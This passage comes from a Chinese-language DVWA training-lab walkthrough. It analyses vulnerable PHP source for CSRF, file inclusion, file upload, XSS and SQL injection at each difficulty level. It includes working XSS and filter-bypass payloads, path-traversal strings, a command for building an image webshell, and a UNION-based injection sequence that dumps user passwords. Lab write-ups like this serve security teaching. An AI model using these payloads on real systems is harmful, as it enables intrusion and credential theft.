$pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125; // Generate Anti-CSRF tokengenerateSessionToken(); ?&gt; 相较于medium 增加了token 用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求 所以需要利用 xss漏洞获取token File Inclusion（文件包含）File Inclusion（文件包含），是指当服务器开启了allow_url_include选项时，通过一些PHP的特性函数（比如：include()，require()，include_once()和require_once()）利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。 文件包含分类本地文件包含：当被包含的文件在本地服务器时，就叫做本地文件包含 例：../../../../../etc/passwd 远程文件包含：当被包含的文件在第三方服务器时，就叫做远程文件包含 例：http://www.baidu.com 可以直接打开百度 特性函数区别include() 当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行include_once() 功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次require() require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行 。使用require()函数包含文件时，只要程序一执行，立即调用文件，而include()只有程序执行到函数时才调用 .require()在php程序执行前执行，会先读入 require 所指定引入的文件，使它变成 PHP 程序网页的一部份。require_once() 它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次 Low源码解析&lt;?php// The page we wish to display//直接获取page参数，未做任何过滤$file = $_GET[ &#x27;page&#x27; ];?&gt; 解决方法无任何过滤，直接本地文件包含 尝试远程文件包含 Medium源码分析&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation//将参数中的http:// https:// ../ ..\\都替换成空$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file );?&gt; 这个地方加了一些过滤，将“http://”，“https://”，“../”，“..\\”全部替换成了空，这个地方其实可以考虑双写绕过。 解决方法构造一个新的 hthttp://tp://www.baidu.com 过滤后 http://www.baidu.com 过滤前 …/./(….//) 过滤后 ../ High源码分析&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation//文件名必须以file开始，或只能为include.phpif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt; 解决方法使用伪协议：file:// （访问本地文件系统） file:// 访问本地文件系统http:// 访问 HTTPs 网址ftp:// 访问 ftp URL Php:// 访问输入输出流Zlib:// 压缩流Data:// 数据Ssh2:// security shell2 Expect:// 处理交互式的流Glob:// 查找匹配的文件路径 伪协议后文件必须是绝对路径 参考文章 文件包含-伪协议_孤君的博客-CSDN博客 File Upload（文件上传）File Upload（文件上传），由于对上传文件的内、类型没有做严格的过滤、检查，使得攻击者可以通过上传木马文件获取服务器的webshell文件。 Low源码解析&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to?//文件的目标路径hackable/uploads/，也就是文件上传的位置 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;// basename(path,suffix)//函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。 $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // Can we move the file to the upload folder?//移动用户上传文件至目标路径 if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 解决方法从源码中可以看到对上传文件的类型、内容没有做任何的过滤与检查，同时告诉了我们文件上传的路径，存在明显的文件上传漏洞。 蚁剑连接 Medium源码分析&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; // Is it an image?//文件类型必须是image/jpeg 或者 image/png，大小不能超过100000B（约为97.6KB） if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 对文件上传的类型做了限制，要求必须是image/jpeg 或者 image/png 类型的。 解决方法抓包更改mime类型 连接蚁剑即可 High源码分析&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Is it an image?// strtoLower把所有字符转换为小写getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。 if( ( strtoLower( $uploaded_ext ) == &quot;jpg&quot; || strtoLower( $uploaded_ext ) == &quot;jpeg&quot; || strtoLower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 这个就必须上传一个图片马了，他对文件的文件头，文件名形式等等都做了检查。 制作图片马 copy a.jpg/b+1.php hack.jpg 解决方法上传图片马 XSS(DOM) DOM型XSSDOM型XSS攻击，不存在服务器端代码，所以没有与服务器端进行交互，只是在操作DO（文件对象），也就是HTML元素，攻击者可以构造js代码，闭合元素标签执行恶意的js代码 XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。 DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。 可能触发DOM型XSS的属性： document.referer属性 window.name属性 location属性 innerHTML属性 documen.write属性 Low源码解析&lt;?php//没有保护，什么都没有# No protections, anything goes?&gt; 解决方法什么保护都没有，直接进行弹窗尝试。 xss常用语句 &lt;script&gt;alert(/xss/)&lt;/script&gt; &lt;svg οnlοad=alert(document.cookie)&gt; ​ &lt;img src=1 οnerrοr=alert(1)&gt; ​ Mediun源码分析&lt;?php// Is there any input?// array_key_exists()检查键是否存在array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。提示：如果指定数组的时候省略了键名，将会生成从 0 开始并以 1 递增的整数键名array_key_exists(key,array)key 必需 规定键名。array 必需。规定数组if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; $default = $_GET[&#x27;default&#x27;]; # Do not alLow script tags//过滤&lt;script，含scriipt的就不可以stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）stripos(string,find,start)string 必需 规定被搜索的字符串。find 必需 规定要查找的字符。start 可选 规定开始搜索的位置。返回值： 返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。 if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;//如果参数不含&lt;scriptheader() 函数向客户端发送原始的 HTTP 报头header(string,replace,http_response_code)string 必需 规定要发送的报头字符串。replace 可选 指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。http_response_code可选 把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用） header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; 解决方法简单来说，就是过滤掉了“&lt;script”，当函数匹配到 &lt;script 字符串的时候就会将URL后面的参数修正为 ?default=English 在这里可以通过onerror事件，在装载文档或图像的过程中如果发生了错误就会触发 因为过滤了script标签 所以通过使用img标签 但是前提要把option和select标签闭合（这里的标签 是根据页面源码写的） &lt;/option&gt;&lt;/select&gt;&lt;imgsrc=xonerror=alert(1)&gt; High源码分析&lt;&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the alLowable languages//白名单，只允许French、English、German、Spanish switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; 解决方法（1）这里设置了白名单，如果default的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为:?default=English ，这里只是对 default 的变量进行了过滤。 （2）可以考虑在English后面使用&amp;或者# English&amp;&lt;script&gt;alert(1)&lt;/script&gt;English#&lt;script&gt;alert(1)&lt;/script&gt; XSS(Reflected) 反射型XSSXSS攻击需要具备两个条件： 需要向web页面注入恶意代码； 这些恶意代码能够被浏览器成功的执行 XSS反射型漏洞 反射型XSS，顾名思义在于“反射”这个一来一回的过程。反射型XSS的触发有后端的参与，而之所以触发XSS是因为后端解析用户在前端输入的带有XSS性质的脚本或者脚本的data URI编码，后端解析用户输入处理后返回给前端，由浏览器解析这段XSS脚本，触发XSS漏洞。因此如果要避免反射性XSS，则必须需要后端的协调，在后端解析前端的数据时首先做相关的字串检测和转义处理；同时前端同样也许针对用户的数据做excape转义，保证数据源的可靠性 基本原理就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆。 特点是：非持久化 必须用户点击带有特定参数的链接才能引起。XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。 LOW源码分析&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?// arrary_key_exists()函数：判断$_GET的值中是否存在“name”键名。并且$_GET[‘name’]的值是否不为空，满足这些条件，直接输出下面的输出语句。if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; 解决方法 服务器只是判断了 name 参数是否为空，如果不为空的话就直接打印出来。服务器并没有对 name 参数做任何的过滤和检查。 payload alert(1) Medium源码分析&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input//将输入中的&lt;script&gt;转化为空 $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 解决方法会检查 name 参数中是否有 “&lt; script &gt;”，如果有则替换为空，也就是说过滤掉了“”这个标签。还有在这里使用了str_replace函数，它是区分大小写的，因此可以使用大小写绕过。 &lt;sCript&gt;alert(1)&lt;/ScRipt&gt; 除了使用大小写绕过，还可以使用双写绕过 &lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt; High源码分析&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input//使用通配符，完全匹配script*N，所以有关script的标签全被过滤 $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 解决方法preg_replace() 函数执行一个正则表达式的搜索和替换，“*” 代表一个或多个任意字符，“i” 代表不区分大小写。也就是说 “&lt; script &gt;” 标签在这里被完全过滤了，但是我们可以通过其他的标签例如 img、body 等标签的事件或者iframe 等标签的 src 注入 JS 攻击脚本。 XSS(Stored) 存储型XSSXSS存储型攻击，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。 存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 Low源码分析&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input// trim(string,charlist)函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\\t、\\n、\\x0B、\\r以及空格，可选参数charlist支持添加额外需要删除的字符。 $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input// stripslashes(string)函数删除字符串中的反斜杠。 $message = stripslashes( $message );// mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义。 $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 解决方法NAME处进行了长度限制，所以我们在Message处使用 alert(1) 进行尝试 再次访问此页面时，就会有次弹窗 成功后更新数据库 源码中出现的函数： 1）trim()函数语法： trim(string,charlist) 参数 描述 string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：”\\0” - NULL”\\t” - 制表符”\\n” - 换行”\\x0B” - 垂直制表符”\\r” - 回车” “ - 空格 2）stripslashes()函数语法： stripslashes(string) 参数 描述 string 必需。规定要检查的字符串。 用于删除反斜杠，可用于清理从数据库中或者从 HTML 表单中取回的数据。 Medium源码分析&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input// strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签// addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 解决方法（1）Message处使用了htmlspecialchars()函数，将字符全部转为了HTML实体，因此Message处无法使用XSS形成攻击。 （2）name处做了长度限制，因此考虑使用抓包在BP中修改name的值，还有就是他会将 转化为空，所有考虑使用双写或者大小写去绕过。 大小写绕过：alert(1) 双写绕过：&lt;script>alert(1) High源码分析&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125; ?&gt; 解决方法（1）Message处相比Medium难度没有做太多的变化，因此不在考虑这里。 （2）Nmae处对 做了限制，各种形式的 都不行了，考虑使用其他的标签，比如img 使用BP改name即可 SQL Injection（SQL注入）SQL Injection（SQL注入），是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。 SQL注入流程拿到一个查询条件的web网页，就需要对输入框做以下的事情 1.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.下载数据 LOW源码分析&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input//获取ID字段 $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database//拼接SQL语句并查询 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 解决方法（1）首先找到注入点，判断注入的类型 11\\1&#x27; # （2）使用二分法判断字段（order by 5,3,2），最终判断存在2个字段 1&#x27; order by 5 #1&#x27; order by 3 #1&#x27; order by 2 # （3）显示报错位 -1’ union select 1,2 # （4）查找库名 1’ union select version(),database() # （5）查找当前数据库中的表 1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # （6）查找表users中的字段 1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ # （7）查找数据 1’ union select group_concat(user),group_concat(password) from users # Mediun源码分析&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ];//user中x00，n，r，，’，”，x1a转义，防SQL注入 $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt; GET提交方式改成了POST提交方式，还使用了转义预防SQL注入。 解决方法同low级别，只不过是在bp上操作 High源码分析&lt;?phpif( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database//【select * from tableName limit i,n 】tableName : 为数据表；i : 为查询结果的索引值（默认从0开始）；n : 为查询结果返回的数量查询第一条数据select * from student limit 1查询第二条数据select * from student limit 1,1 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125;?&gt; 解决方法high 级别使用了session 获取id 值，闭合方式单引号闭合。 解决方法同low级别一样 SQL Injection(Blind)（SQL注入之盲注）SQL Injection(Blind)，SQL盲注，相比于常规的SQL注入，他不会将返回具体的数据信息或语法信息，只会将服务器包装后的信息返回到页面中。 常规SQL注入与SQL盲注详细对比 SQL注入 1.执行SQL注入攻击时，服务器会响应来自数据库服务器的错误信息，信息提示SQL语法不正确等。 2.一般在页面上直接就会显示执行sql语句的结果。 SQL盲注 1.一般情况，执行SQL盲注，服务器不会直接返回具体的数据库错误or语法错误，而是会返回程序开发所设置的特定信息（也有特例，如基于报错的盲注） 2.一般在页面上不会直接显示sql执行的结果 3.有可能出现不确定sql是否执行的情况 （参考：https://www.jianshu.com/p/757626cec742） 布尔盲注与时间盲注对比布尔盲注 可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。 时间盲注 通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。 SQL盲注流程1.判断是否存在注入，注入的类型 2.猜解当前数据库名称 3.猜解数据库中的表名 4.猜解表中的字段名 5.获取表中的字段值 6.验证字段值的有效性 